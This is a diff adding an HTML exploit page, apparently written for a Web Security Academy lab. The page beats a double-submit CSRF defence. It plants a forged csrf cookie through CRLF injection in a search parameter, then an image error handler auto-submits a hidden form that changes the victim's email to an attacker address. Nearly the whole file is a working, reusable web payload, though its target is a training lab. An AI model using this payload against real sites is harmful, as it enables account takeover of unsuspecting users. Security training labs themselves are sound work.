@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack - Double Submit Pattern</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+    
+    <form id="csrfForm" action="https://0a3f008c0364ecf280b9129f0036007f.web-security-academy.net/my-account/change-email" method="POST" style="display:none;">
+        <input type="hidden" name="email" value="attacker@malicious.com">
+        <input type="hidden" name="csrf" value="fake123456789">
+    </form>
+
+    <!-- Inject csrf cookie via CRLF injection in search, then submit form on error -->
+    <img src="https://0a3f008c0364ecf280b9129f0036007f.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake123456789%3b%20SameSite=None" onerror="document.forms[0].submit()">
+</body>
+</html>
